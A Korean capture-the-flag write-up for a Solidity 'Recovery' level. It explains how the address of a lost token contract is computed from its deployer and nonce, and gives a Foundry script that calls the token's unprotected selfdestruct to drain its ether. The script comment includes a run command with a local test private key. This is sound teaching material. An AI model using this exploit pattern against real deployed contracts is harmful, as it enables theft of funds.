# 지문

한 컨트랙트 작성자가 아주 간단한 토큰 팩토리 컨트랙트를 만들었습니다. 누구나 손쉽게 새 토큰을 생성할 수 있습니다. 첫 번째 토큰 컨트랙트를 배포한 뒤, 작성자는 더 많은 토큰을 얻기 위해 0.001 이더를 보냈습니다. 그런데 그 이후로 해당 컨트랙트 주소를 잃어버렸습니다.

이 레벨은 분실된 컨트랙트 주소에서 0.001 이더를 회수(또는 인출)하면 완료됩니다.

```solidity

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Recovery {
    //generate tokens
    function generateToken(string memory _name, uint256 _initialSupply) public {
        new SimpleToken(_name, msg.sender, _initialSupply);
    }
}

contract SimpleToken {
    string public name;
    mapping(address => uint256) public balances;

    // constructor
    constructor(string memory _name, address _creator, uint256 _initialSupply) {
        name = _name;
        balances[_creator] = _initialSupply;
    }

    // collect ether in return for tokens
    receive() external payable {
        balances[msg.sender] = msg.value * 10;
    }

    // allow transfers of tokens
    function transfer(address _to, uint256 _amount) public {
        require(balances[msg.sender] >= _amount);
        balances[msg.sender] = balances[msg.sender] - _amount;
        balances[_to] = _amount;
    }

    // clean up after ourselves
    function destroy(address payable _to) public {
        selfdestruct(_to);
    }
}
```

# 풀이 


Etherscan을 봐서 Transaction을 분석하는 방법도 있겠지만 일단 Local에 환경을 구축하고 한지라 tracer같은게 따로 없었음.
그래서 문제에 주어진 `Recovery` contract로부터 파생되는 Contract address 계산방법을 숙지하고 그대로 계산하면됨.

별개로 Foundry에서 Create address를 계산하는 api를 지원해서 그것을 쓰면됨

```go
// go-ethereum 구현체 일부
// Create creates a new contract using code as deployment code.
func (evm *EVM) Create(caller common.Address, code []byte, gas uint64, value *uint256.Int) (ret []byte, contractAddr common.Address, leftOverGas uint64, err error) {
contractAddr = crypto.CreateAddress(caller, evm.StateDB.GetNonce(caller))
return evm.create(caller, code, gas, value, contractAddr, CREATE)
}

...
// CreateAddress creates an ethereum address given the bytes and the nonce
func CreateAddress(b common.Address, nonce uint64) common.Address {
data, _ := rlp.EncodeToBytes([]interface{}{b, nonce})
return common.BytesToAddress(Keccak256(data)[12:])
}

```



```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script} from "forge-std/Script.sol";
import "forge-std/console.sol";

interface ITarget {
    function destroy(address payable _to) external;
}
contract SolveScript is Script {
    address public target = 0x8e80FFe6Dc044F4A766Afd6e5a8732Fe0977A493;

    function setUp() public {}

    // forge script -vvv script/Solve.s.sol --broadcast --tc SolveScript --legacy --private-key 0x5de4111afa1a4b94908f83103eb1f1706367c2e68ca870fc3fb9a804cdab365a --rpc-url http://localhost:8545
    function run() public {
        vm.startBroadcast();
        address token = vm.computeCreateAddress(target, 1);
        console.log("Token address calculation : %s", token);
        console.log("Token address code length : %d", token.code.length);

        ITarget(token).destroy(payable(address(0x3C44CdDdB6a900fa2b585dd299e03d12FA4293BC)));
        vm.stopBroadcast();
    }
}
```